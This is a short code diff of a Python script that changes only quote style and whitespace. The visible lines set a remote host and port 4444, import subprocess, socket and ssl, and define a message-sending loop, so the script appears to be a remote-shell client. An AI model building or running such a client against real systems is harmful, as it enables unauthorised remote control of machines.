@@ -1,7 +1,7 @@
 from subprocess import call
 from socket import socket
 import ssl, sys
-rhost = 'morbidchimp'
+rhost = "morbidchimp"
 rport = 4444
 
 def sendmessage(data):
@@ -31,5 +31,6 @@ while 1:
    else:
       data = input
       sendmessage(data)
+      
 
 
